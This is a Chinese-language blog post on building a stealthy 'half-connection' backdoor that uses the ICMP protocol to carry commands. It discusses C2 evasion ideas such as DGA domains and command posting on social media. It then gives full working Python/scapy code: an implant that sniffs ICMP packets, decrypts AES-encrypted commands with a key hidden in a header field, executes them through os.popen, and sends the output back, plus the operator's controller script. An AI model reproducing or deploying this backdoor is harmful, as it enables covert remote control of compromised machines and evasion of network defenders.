# python 利用icmp协议打造半连接后门

# 思路

思路来自之前写后门的一点想法，socket通信有端口的连接，所以暴露很容易的事。所以考虑写这种半连接式的后门，将要执行的指令藏在其他数据包中，通过截获数据包中的数据进行两边的交互。确实也有像贾师傅说的资源消耗的问题。不过我觉得对于一个后门来说，比起资源消耗，隐蔽性应该更加重要。

## 客户端和服务端的选择

之前没有说，感觉这个还是有讨论点的。算是上文的一个伏笔，和本文内容不太大噶。（因为我们这个都没有连接的概念啦

### 正向连接

这里牵涉的是一个c&c服务器架设问题，正向连接即在有公网ip的目标机器上建立服务端，然后我们通过联机对方ip发送指令。既要求对方机器有公网ip，我们在主动连接对方的情况下也没有什么很好的隐藏手段。同时对方机器某个端口突然开放且有很多数据交互也容易被发现（老生常谈）。

优点或许就是可以多设备连接...?


### 反向连接

由对方来主动连接我们架设在公网上的服务，在当前以反弹shell为主的大环境下就可以看出反向连接的优势了。

譬如bash之类的命令，直接连接目标ip，虽然通过观察流量很容易被发现，但是简短，容易混淆，所以使用也很广泛

又比如我们之前写的那个架设在自己服务器上的服务端，在目标机上下载客户端来连接的后门，由于是对方主动连接，我们就可以动点手脚，比如通过域名连接，伪装成正常的访问之类的。担心一个域名容易被发现的话还可以多整几个域名指向我们服务器，写个列表挨个访问。更过分点可以靠DGA(Domain Generation Algorithm)算法用种子生成一堆随机域名挨个访问，我们只控制其中几个域名即可，这样虽然延迟高点但是隐蔽性算是拉满了

### 半连接

就像我们目标一样，不建立起连接，而通过其他思路来让对方获取到我们c&c服务器的指令。

譬如一些ban了tcp或者udp连接的环境下，利用其他协议数据包进行半连接就是最好的外带方法了。

除此之外，我们也可以自建一个正常网站，在上面发布指令，由客户端爬虫爬取指令来执行。我们可以把指令藏的深一点，就和之前说的基本上只有爬虫才能看到的数据之类的。这样乍一看目标机就是在访问正常网站而已。

这个思路也可以应用到一些热门社交网站上，譬如微博，twitter，建一个号在上面发布指令，受害机去爬取，这种流量乍一看再正常不过了。（有个py2的项目twittor就是这样）要说的话写的思路也差不了多少。

主要看对方到底开放了哪些协议，利用点也很多。

## 实现

### icmp协议

这个协议之前也说过了，是用来确定同目标主机之间是否通畅的，也就是ping。

我们还是用scapy库来构造数据包，我们可以康康这些可控元素修改哪些是可以正常发送的

`packet = IP(src=ip_from,dst=ip_target,ttl=1,id=999)/ICMP(id=999,seq = 30000)/b'helloworld'`

从以太网头部开始，由于我们只要让对方收到包即可所以来源ip地址随便构造即可，其他可控的比如ttl(范围0-255，但是每过一个路由器就会减一)，id(范围0-65535)，是可以自己构造的。这部分包括后门icmp中的id(范围0-65535)和seq(范围0-65535)都是可以自己构造的，对数据包正常发送无大影响，像是我们如果用aes这种单密钥加密形式加密流量的话，这些地方就是藏密钥的好地方。（随机一个密钥用于数据的加密然后将该密钥放在这些位置里，客户端接收包时再接收密钥，对于数据的加密传输也是好事。注意密钥要在范围内）

又看icmp协议，type(类型)和code(编码)控制了报文的类型和作用。虽然也可控但类型少且常用的也只有0800(回声请求，也就是ping)

<img src='https://0xfay.github.io/public/image/203413.jpg'>

checksum(校验码)由字段包含有从 ICMP 报头和数据部分计算得来的，用于检查错误的数据，也就不算可控。

所以剩下的就只有ID和Sequence（两个都用于在 Echo Reply 类型的消息中返回该字段）

数据区域肯定是可控的，而且长度没啥限制（基本能满足数据传输了）。当年死亡之ping能发送超65500长度限制的包，我卢本伟发个几百bit的包不是问题（大雾

<img src='https://0xfay.github.io/public/image/162338.jpg'>

### 数据收发

收发就用scapy本身的函数就行。

收函数用sniff，sniff中的filter过滤，lfilter用回调函数过滤丢弃不符合条件的包（可以自己写一个判断函数），count设置收的数量...用这些来过滤得到我们想要的做了标记的包

`result = sniff(count=1,filter="icmp",lfilter=lambda x:check_icmp(x[0]))`

这是我的一个接收函数，check_icmp是我自定的一个用于判断是否满足条件的函数

发就用sendp就行，没什么好说的


现在我们只需要一个标记辨别这确实是c&c服务器发过来的指令，我的思路是从上面的可控量里选一个。

同时，改变icmp类型为不是0800的话是不会有返回包的，或许还可以减少不必要的资源消耗？

但这里我就踩坑了，注意，用没有响应的包的话（譬如类型9，类型10），icmp协议中的id和seq会被替换为unused

<img src='https://0xfay.github.io/public/image/113943.jpg'>

图中上面一个包是类型8，下面一个包是类型9，很明显类型9并没有id和seq（合情合理，因为并没有返回包，所以要id和seq没有用）。这里unused=10是因为我改了，unused默认是0，不过也证明unused是可控的。

这个unused好像没有大小限制？虽然是这么说，不过在长度为10左右过后打包就会报错了，猜测是转为16进制过后超过8位限制了，测试后最大值为4294967295,即16进制的ffffffff。

<img src='https://0xfay.github.io/public/image/114832.jpg'>

同时也学到点经验...你构造的包和你发出去后包的样子其实还是不一样的，所以要调试还是得完整的调试。

### 流量加密

我采用了aes加密，将密钥藏在unused中。当然我觉得更好的还是用类型8中的id和seq，一个用来传密钥，一个用来当c&c服务器特征码。不过会有返回包..处理起来更麻烦些，我就直接用类型9了。

其余加密方式也可以，根据情况选择。主要就是为了流量中不会有明文出现。

## 代码区域

目标机

```
from scapy.all import *
from Crypto.Cipher import AES
import os


global ip_target
#目标机器ip
ip_target = '47.112.188.203'

BLOCK_SIZE = 16  # Bytes
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

def check_icmp(packet):
    if packet.haslayer(ICMP):
        if packet[ICMP].type == 9:
            return True

def get_command(packet):
    cmd = packet[Raw].load
    return cmd

def get_key(packet):
    key = packet[ICMP].unused
    key = hex(key)[2:10]*2
    return key

def sniff_icmp():
    result = sniff(count=1,filter="icmp",lfilter=lambda x:check_icmp(x[0]))
    cmd_encrypt = get_command(result[0])
    key = get_key(result[0])
    cmd = aesDecrypt(key,cmd_encrypt)
    result = exec_commamnd(cmd)
    return result

def aesDecrypt(key, data):
    key = key.encode('utf8')
    cipher = AES.new(key, AES.MODE_ECB)

    # 去补位
    text_decrypted = unpad(cipher.decrypt(data))
    text_decrypted = text_decrypted.decode('utf8')
    return text_decrypted

def aesEncrypt(key, data):
    key = key.encode('utf8')
    # 字符串补位
    data = pad(data)
    cipher = AES.new(key, AES.MODE_ECB)
    # 加密后得到的是bytes类型的数据，使用Base64进行编码,返回byte字符串
    result = cipher.encrypt(data.encode())
    return result

def exec_commamnd(cmd):
    result = os.popen(cmd).read()
    return result

def send_icmp(result):
    key = random.randint(268435455,4294967295)
    key_encrypt = hex(key)[2:10]*2

    result_encrypt = aesEncrypt(key_encrypt,result)
    packet = IP(dst=ip_target,ttl=64,id=10)/ICMP(type=10,unused=key)/result_encrypt
    send(packet)

while True:
    result = sniff_icmp()
    send_icmp(result)

```

本地机

```
from scapy.all import *
import random
from Crypto.Cipher import AES

BLOCK_SIZE = 16  # Bytes
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

global ip_from_list
ip_from_list = ['47.112.188.200','32.99.215.42']

global ip_target
ip_target = '47.112.188.203'


def send_icmp():
    cmd = input('[+] please input command:>>')
    key = random.randint(268435455,4294967295)
    key_encrypt = hex(key)[2:10]*2
    cmd_encrypt = aesEncrypt(key_encrypt,cmd)

    #sign_flag = sign_flag_list[random.randint(0,len(sign_flag_list)-1)]
    ip_from = ip_from_list[random.randint(0,len(ip_from_list)-1)]
    #packet = IP(dst=ip_target,ttl=64,id=10)/ICMP(type=8,id=20,seq=sign_flag)/cmd.encode()
    
    packet = IP(dst=ip_target,ttl=64,id=10)/ICMP(type=9,unused=key)/cmd_encrypt
    send(packet)

def aesEncrypt(key, data):
    key = key.encode('utf8')
    # 字符串补位
    data = pad(data)
    cipher = AES.new(key, AES.MODE_ECB)
    # 加密后得到的是bytes类型的数据，使用Base64进行编码,返回byte字符串
    result = cipher.encrypt(data.encode())
    return result

def aesDecrypt(key, data):
    key = key.encode('utf8')
    cipher = AES.new(key, AES.MODE_ECB)

    # 去补位
    text_decrypted = unpad(cipher.decrypt(data))
    text_decrypted = text_decrypted.decode('utf8')
    return text_decrypted

def sniff_icmp():
    result = sniff(count=1,filter="icmp",lfilter=lambda x:check_icmp(x[0]))
    result_encrypt = get_result(result[0])
    key = get_key(result[0])
    result = aesDecrypt(key,result_encrypt)
    return result

def check_icmp(packet):
    if packet.haslayer(ICMP):
        if packet[ICMP].type == 10:
            return True

def get_result(packet):
    result = packet[Raw].load
    return result

def get_key(packet):
    key = packet[ICMP].unused
    key = hex(key)[2:10]*2
    return key

while True:
    send_icmp()
    result = sniff_icmp()
    print(result)
```

# 下个目标

最近有在学powershell，nishang框架中其实也有icmp协议反弹shell的脚本，准备分析分析自己也模仿着做一个（为什么要造轮子呢

